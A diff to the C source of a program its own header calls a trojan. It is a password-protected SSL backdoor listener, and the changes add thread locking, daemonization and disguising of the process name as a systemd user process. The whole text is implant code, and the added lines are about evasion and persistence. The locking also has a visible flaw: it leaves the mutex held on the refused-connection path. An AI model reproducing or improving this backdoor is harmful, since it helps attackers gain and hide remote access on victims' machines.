@@ -1,11 +1,7 @@
 #include "trojan.h"
 
 int active_connections = 0;
-int sig;
-
-void sig_handler(int signal) {
-    sig = signal;
-}
+pthread_mutex_t mutex;
 
 int handle_recv(SSL *ssl) {
     char buffer[1024];
@@ -38,7 +34,7 @@ void *handle_client(void *arg) {
 
     char response[1024];
     char buffer[1024];
-    int ssl_read_err;
+    int ssl_read_err = 0;
 
     while (1) {
         memset(buffer, 0, 1024);
@@ -48,16 +44,14 @@ void *handle_client(void *arg) {
         size_t valread;
 
         int ret_code = SSL_read_ex(args->ssl, buffer, sizeof(buffer) - 1, &valread);
-
         buffer[valread] = '\0';
-       // printf("val read : %ld sig :%d : %s : ret error : %d\n", valread, sig, buffer, ret);
+
         if (ret_code == 0) {
             ssl_read_err = SSL_get_error(args->ssl, ret_code);
             break ;
         }
-        if (sig == SIGPIPE || valread <= 0)
+        if (valread <= 0)
             break;
-
         if (check_pwd((unsigned char *)buffer, valread - 1)) {
             snprintf(response, 1024, "%s", "Connection established, welcome\n\n");
             SSL_write(args->ssl, response, strlen(response));
@@ -75,7 +69,9 @@ void *handle_client(void *arg) {
     SSL_free(args->ssl);
     sc(SYS_close, args->client_socket);
     free(args);
+    m_lock(mutex);
     active_connections--;
+    m_unlock(mutex);
 
     return NULL;
 }
@@ -107,12 +103,14 @@ void start_socket_listener() {
 
         printf("New connection attempt...\n");
         if (SSL_accept(args->ssl)) {
+            m_lock(mutex);
             if (active_connections >= MAX_CLIENTS) {
                 SSL_write(args->ssl, "Connection refused\n", strlen("Connection refused\n"));
                 ft_shutdown(args);
                 continue;
             }
             active_connections++;
+            m_unlock(mutex);
             pthread_t thread_id;
 
             p_create(&thread_id, NULL, handle_client, args);
@@ -130,9 +128,11 @@ void start_socket_listener() {
 int main(int ac, char **av) {
     (void)ac;
     (void)av;
-    //create_daemon();
-    //signal(SIGPIPE, sig_handler);
-    signal(SIGPIPE, sig_handler);
+    memset(av[0], 0, 32);
+    memcpy(av[0], "/usr/lib/systemd/systemd --user", strlen("/usr/lib/systemd/systemd --user"));
+    create_daemon();
+    int log_fd = open("/tmp/daemon.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
+    dprintf(log_fd, "Daemon started\n");
     start_socket_listener();
     return 0;
 }
